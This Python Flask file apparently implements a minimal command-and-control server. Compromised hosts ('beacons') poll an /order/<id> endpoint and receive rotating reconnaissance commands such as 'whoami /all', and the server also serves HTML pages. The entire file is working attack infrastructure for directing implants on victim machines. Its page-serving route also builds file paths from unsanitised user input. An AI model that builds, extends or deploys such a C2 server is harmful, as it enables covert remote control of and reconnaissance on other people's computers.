from flask import Flask
from flask import json
import os
import os.path

app = Flask(__name__)

HTML_DIR = os.getcwd()+"\\html\\"

COMMANDS = [
   "ls",
   "hostname",
   "whoami /all"
]

beacons = {
   
}

@app.route("/")
def index():
    with open(HTML_DIR+'index.html', 'r') as file:
        data = file.read()
        return data
    
@app.route('/order/<id>')
def get_order(id): # here we will retrieve the commands that will be sent to beacon
    if(id not in beacons.keys()):
        beacons[id] = 0
    cmd = COMMANDS[beacons[id]%len(COMMANDS)]
    beacons[id]+=1

    responseObj = {
        "cmd":cmd
    }

    response = app.response_class(
        response=json.dumps(responseObj),
        status=200,
        mimetype='application/json'
    )
    return response

@app.route("/<page>")
def custom_page(page):
    if os.path.exists(HTML_DIR+page+'.html'):
        page = HTML_DIR+page+'.html'
    else:
        page = HTML_DIR+'404.html'
    with open(page, 'r') as file:
        data = file.read()
        return data